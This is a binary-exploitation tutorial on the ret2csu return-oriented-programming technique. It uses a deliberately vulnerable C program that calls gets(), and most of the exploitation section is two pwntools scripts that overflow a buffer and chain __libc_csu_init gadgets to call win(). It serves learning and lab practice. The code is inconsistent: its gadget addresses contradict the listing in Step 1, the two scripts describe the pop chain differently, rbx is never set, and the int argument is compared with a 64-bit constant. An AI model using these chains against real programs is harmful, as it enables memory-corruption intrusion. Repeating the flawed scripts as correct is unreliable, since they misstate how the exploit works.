# ret2csu: Controlling Registers When Gadgets are Lacking

## Overview

The `ret2csu` (Return-to-CSU) technique is used to populate registers when there is a lack of convenient gadgets, particularly in binaries that are dynamically compiled and linked to libc. This technique exploits specific function chains, like those found in `__libc_csu_init`, which can be leveraged to manipulate registers, even when direct gadgets are absent.

### The Concept

When a binary is dynamically compiled with libc linked to it, certain functions and initialization routines contain "gadgets" that can be used to control registers. The function `__libc_csu_init` contains a series of gadgets that can be exploited to populate registers, especially the critical ones required for syscalls like `execve()` or `write()`.

Key gadgets in the `__libc_csu_init` function include:

- `pop rbx`, `pop rbp`, `pop r12`, `pop r13`, `pop r14`, `pop r15`, `ret`
- Instructions like `mov rdx, r14`, `mov rsi, r13`, and `mov edi, r12d`
- The call to `qword [r15 + rbx*8]`, which makes it possible to control where the program jumps by setting `r15` and `rbx`.

By using `ret2csu`, we can chain these operations together, even when gadgets for individual registers (like `rdx` and `rsi`) are missing. 

### The `ret2csu` Workflow

1. **Find Gadgets**: Identify `pop` gadgets and function chains within `__libc_csu_init` that allow you to control the registers needed for the syscall or function call you want to exploit.

2. **Populate Registers**: Use the gadgets to populate registers like `rdx`, `rsi`, and `rdi`. For example, `mov rdx, r14` and `mov rsi, r13` allow us to control values directly.

3. **Execute Function Calls**: Use the `call qword [r15 + rbx*8]` instruction to jump to the function you want to exploit (e.g., `win()` or `execve()`) by controlling `r15` and `rbx`.

4. **Trigger Exploit**: By executing a chain of operations, you can trigger syscalls like `execve()` for spawning a shell or call functions like `write()` with the required arguments.

## Exploitation Example

### Binary Overview

Consider the following vulnerable binary with a `win()` function and `gets()` vulnerable to buffer overflow:

```c
#include <stdio.h>

int win(int x, int y, int z) {
    if (z == 0xdeadbeefcafed00d) {
        puts("Awesome work!");
    }
}

int main() {
    puts("Come on then, ret2csu me");

    char input[30];
    gets(input);
    return 0;
}
```

In this example, we aim to use `ret2csu` to control registers and call the `win()` function with the correct parameters.

### Step 1: Finding Gadgets

The necessary gadgets and instructions are found in the `__libc_csu_init` function, which contains chains for controlling registers. The key gadgets are:

```
0x004011a2 pop rbx
0x004011a3 pop rbp
0x004011a4 pop r12
0x004011a6 pop r13
0x004011a8 pop r14
0x004011aa pop r15
0x004011ac ret
```

These gadgets allow us to populate `r12`, `r13`, `r14`, and `r15`, which are crucial for controlling the registers used in system calls.

### Step 2: Crafting the Payload

To exploit this, we need to populate the registers in a specific order. Here's how you can do it using Pwntools:

```python
from pwn import *

# Initialize the binary and process
elf = context.binary = ELF('./vuln')
p = process()

# Gadgets and memory locations
POP_CHAIN = 0x00401224  # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028  # Writable location for win() address

# Create the ROP chain
rop = ROP(elf)
rop.raw('A' * 40)  # Buffer overflow to reach the return address
rop.gets(RW_LOC)  # Write win() address to RW_LOC

rop.raw(POP_CHAIN)  # Pop registers
rop.raw(0)          # r12
rop.raw(0)          # r13
rop.raw(0xdeadbeefcafed00d)  # r14 (passed into rdx)
rop.raw(RW_LOC)     # r15 - points to win()
rop.raw(REG_CALL)   # Call the function at the address in r15

# Send the payload
p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))  # Send win() address to gets()
print(p.recvline())  # Should print "Awesome work!"
```

### Step 3: Final Exploit

After the payload is crafted, it sends the address of `win()` to the buffer. By using `ret2csu`, we populate `r12`, `r13`, `r14`, and `r15` with the necessary values to eventually call `win()` through `gets()`:

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401228  # pop r14, pop r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028  # Writable memory location for win() address

rop = ROP(elf)
rop.raw('A' * 40)  # Overflow the buffer
rop.gets(RW_LOC)  # Write win() address to RW_LOC

rop.raw(POP_CHAIN)  # Pop r14, r15
rop.raw(0xdeadbeefcafed00d)  # r14 into rdx
rop.raw(RW_LOC)  # r15 points to win() function address
rop.raw(REG_CALL)  # Execute the call to win()

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))  # Write the address of win() to gets()
print(p.recvline())  # Output: "Awesome work!"
```